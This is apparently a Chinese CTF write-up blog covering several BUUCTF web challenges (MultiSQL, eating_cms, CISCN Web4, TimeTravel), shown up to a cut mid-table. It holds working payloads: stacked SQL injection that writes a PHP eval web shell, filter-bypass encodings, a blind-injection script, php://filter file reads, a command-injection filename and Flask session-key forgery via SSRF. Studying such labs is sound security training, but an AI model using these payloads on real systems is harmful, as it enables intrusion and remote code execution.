<h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>知识点 ：</p>
<ol>
<li>sql预编译</li>
<li>写文件getshell</li>
</ol>
<p>注册登入后在/user/user.php?id= 处存在注入点</p>
<p>fuzz测试后发现过滤了<code>union，select ，&amp;，|</code>，过滤了select然后存在堆叠注入的可以使用预处理注入，尝试写入shell，方法一hex编码</p>
<blockquote>
<p>SELECT ‘<?php @eval($_POST[1]);?>‘ into outfile ‘/var/www/html/favicon/1.php’</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">user</span>/user.php?id=<span class="number">2</span>;set @xx=<span class="number">0</span>x<span class="number">53454</span>c<span class="number">45435420273</span>c<span class="number">3</span>f<span class="number">70687020406576616</span>c<span class="number">28245</span>f<span class="number">504</span>f<span class="number">53545</span>b<span class="number">315</span>d<span class="number">293</span>b<span class="number">3</span>f<span class="number">3</span>e<span class="number">2720696</span>e<span class="number">746</span>f<span class="number">206</span>f<span class="number">757466696</span>c<span class="number">6520272</span>f<span class="number">7661722</span>f<span class="number">7777772</span>f<span class="number">68746</span>d<span class="number">6</span>c<span class="number">2</span>f<span class="number">66617669636</span>f<span class="number">6</span>e<span class="number">2</span>f<span class="number">312</span>e<span class="number">70687027</span>;prepare x from @xx;execute x;</span><br></pre></td></tr></table></figure>
<p>之后在favicon/1.php 页面 ，POST传参命令执行即可</p>
<p>方法二 char()编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&quot;select &#x27;&lt;?php eval($_POST[_]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;&quot;</span></span><br><span class="line">len_str=<span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,len_str):</span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">		print(<span class="string">&#x27;char(%s&#x27;</span>%<span class="built_in">ord</span>(<span class="built_in">str</span>[i]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(<span class="string">&#x27;,%s&#x27;</span>%<span class="built_in">ord</span>(<span class="built_in">str</span>[i]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="string">&#x27;)&#x27;</span>)</span><br></pre></td></tr></table></figure>


<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">2</span>;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="type">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">60</span>,<span class="number">63</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">32</span>,<span class="number">101</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">40</span>,<span class="number">36</span>,<span class="number">95</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">91</span>,<span class="number">95</span>,<span class="number">93</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">63</span>,<span class="number">62</span>,<span class="number">39</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">47</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">47</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">47</span>,<span class="number">104</span>,<span class="number">116</span>,<span class="number">109</span>,<span class="number">108</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">105</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">39</span>,<span class="number">59</span>);<span class="keyword">prepare</span> query <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> query;</span><br></pre></td></tr></table></figure>


<hr>
<p>还可以文件读取，不过读不到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;p5cm28cnklnclpvk346o9od5b5&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data=<span class="string">&#x27;0x&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9999</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="comment">#print (i)</span></span><br><span class="line">        url=<span class="string">&#x27;http://9f68062c-bd5d-4812-8ff1-fd1e0226e3dc.node3.buuoj.cn/user/user.php?id=0^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))&lt;&#x27;</span>+data+<span class="built_in">str</span>(<span class="built_in">hex</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        print(url)</span><br><span class="line">        result=r.get(url=url,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            data+=<span class="built_in">str</span>(<span class="built_in">hex</span>(i-<span class="number">1</span>)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            flag+=(<span class="built_in">chr</span>(i-<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span> (flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>


<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>知识点：</p>
<ol>
<li>命令执行</li>
<li>伪协议</li>
</ol>
<p>登入页面抓包，发现login.php，因此猜测存在register.php</p>
<p>访问register.php,注册 – &gt; 登录，看到<code>user.php?page=</code></p>
<p>直接伪协议读取文件，由于page=guest，猜测真实文件就是guest.php，那么我们直接写index就好了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] ))&#123;</span><br><span class="line">    Header(<span class="string">&quot;Location: user.php?page=info&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;templates/index.html&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function.php</span><br><span class="line"><span class="comment">//这里只放部分代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Header(<span class="string">&quot;Location: hacker.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    parse_str(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在function.php 中使用parse_url和parse_str来判断URL中是否有危险字符。<br>而parse_url都是可以绕过了。在域名后面多加两个/即可绕过，我们尝试读取ffffllllaaaaggg</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://xxx///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg">http://xxx///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</a></p>
</blockquote>
<p>读取到这个文件了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you can find sth in m4aaannngggeee&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
<p>继续读取<code>m4aaannngggeee</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;templates/upload.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
<p>访问<code>http://e6cd3ddc-023e-46e1-a2ee-f2b6a66d576f.node3.buuoj.cn/templates/upload.html</code></p>
<p>是个文件上传的页面，不过我们尝试文件上传后发现404报错，根据报错信息知道存在upllloadddd.php，用之前的伪协议读取这个文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$allowtype</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"><span class="variable">$size</span> = <span class="number">10000000</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:not an upload file！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newfile</span> = <span class="variable">$path</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file upload success&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$picdata</span> = system(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="variable">$picdata</span>.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink(<span class="variable">$newfile</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ext</span> = array_pop(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>,<span class="variable">$allowtype</span>))&#123;</span><br><span class="line">    unlink(<span class="variable">$newfile</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>关键之处在于</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$picdata = <span class="keyword">system</span>(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>命令执行，我们传个文件名为<code>123.php;cd ..;cat flag</code>的文件即可得到flag</p>
<h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p>知识点：</p>
<ol>
<li>uuid_getnode</li>
<li>session</li>
<li>ssrf</li>
</ol>
<p>在buu上复现的，方法对了，但是不知道为什么不出flag，<del>导致死磕了很久，一直以为是自己方法错了</del></p>
<p>进入环境，点进去之后，发现跳转到baidu，很明显SSRF</p>
<p>fuzz后发现 file://等被过滤了，直接上 /proc/self/cmdline</p>
<blockquote>
<p>/usr/local/bin/python/app/app.py</p>
</blockquote>
<p>那就SSRF下app.py,得到代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>只有满足存在session，且<code>session[&#39;username&#39;] == &#39;fuck&#39;</code>即可得到flag,想要伪造session,需要SECRET_KEY</p>
<p><strong>对全部的源码进行分析了，直接查找所需的<code>SECRET_KEY</code>的值发现：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure>
<p><strong>其对<code>SECRET_KEY</code>做了<code>random</code>随机处理，但<code>random</code>生成的随机数都是伪随机数，有一定的规律。</strong><br><strong>发现了其中：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure>
<p><strong><code>random.seed()</code>方法改变随机数生成器的种子，<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/551a95290645">Python之random.seed()用法</a></strong><br><strong><code>uuid.getnode()</code>方法以<code>48</code>位正整数形式获取硬件地址，也就是服务器的MAC地址</strong></p>
<p><strong>若获取了服务器的MAC地址值，那么就可以构造出为伪随机的种子值，想到Linux中一切皆文件，查找到MAC地址存放在<code>/sys/class/net/eth0/address</code>文件中，读取该文件：得到其十六进制所表示的MAC地址</strong></p>
<p>然后脚本把它转换为10进制数，然后转换成SECRET_KEY</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">mac=<span class="string">&quot;02:42:ac:10:a4:ef&quot;</span></span><br><span class="line">random.seed(<span class="built_in">int</span>(mac.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="number">16</span>))</span><br><span class="line">key = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>
<p>然后利用flask-session-cookie-manager进行伪造即可，然后将得到的伪session代替原session，访问/flag，即可得到flag    ,<del>迷惑的地方就是这里，我拿伪造的session进到/flag页面，一直给我回显Access denied</del></p>
<h2 id="V-amp-N2020-公开赛-TimeTravel"><a href="#V-amp-N2020-公开赛-TimeTravel" class="headerlink" title="[V&amp;N2020 公开赛]TimeTravel"></a>[V&amp;N2020 公开赛]TimeTravel</h2><p>知识点：httpoxy</p>
<p>要哭了，看着wp搞了一天，结果最后还是没出flag，这里记录下过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$client</span> = <span class="keyword">new</span> Client();</span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$client</span>-&gt;get(<span class="string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$response</span>-&gt;getBody();</span><br><span class="line">    <span class="variable">$data</span> = json_decode(<span class="variable">$content</span>, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;success&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>?phpinfo</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu49.jpg"></p>
<p>满足success===true，就回显flag </p>
<p><strong>通过google搜索GuzzleHttp vuln ,可以发现有个httpoxy的漏洞，考点就是这里<a href="https://httpoxy.org/" target="_blank">https://httpoxy.org/</a></strong></p>
<blockquote>
<p><strong>在CGI(RFC 3875)的模式的时候， 会把请求中的Header， 加上HTTP_ 前缀， 注册为环境变量, 所以如果你在Header中发送一个Proxy:xxxxxx, 那么PHP就会把他注册为HTTP_PROXY环境变量， 于是getenv(“HTTP_PROXY”)就变成可被控制的了. 那么如果你的所有类似的请求， 都会被代理到攻击者想要的地址，之后攻击者就可以伪造，监听，篡改你的请求了</strong></p>
</blockquote>
<p><strong>利用条件：</strong></p>
<ul>
<li><strong>代码以cgi模式运行，其中使用环境变量<code>HTTP_PROXY</code></strong></li>
<li><strong>信任 HTTP 客户端<code>HTTP_PROXY</code>并将其配置为代理</strong></li>
<li><strong>在请求处理程序中使用的该客户端发出HTTP（与HTTPS相对）请求</strong></li>
</ul>
<p><strong>受影响范围</strong></p>
<table>
<thead>
<tr>
<th><strong>Language</strong></th>
<th><strong>Environment</strong></th>
<th><strong>HTTP client</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>PHP</strong></td>
<td><strong>php-fpm<br>mod_php</strong></td>
<td><strong>Guzzle 4+<br>Artax</strong></td>
</tr>
<tr>
<td><strong>Python</strong></td>
<td><strong>wsgiref.handlers.CGIHandler<br>twisted.web.twcgi.CGIScript</strong></td>
<td><strong>requests</strong></td>
</tr>
<tr>
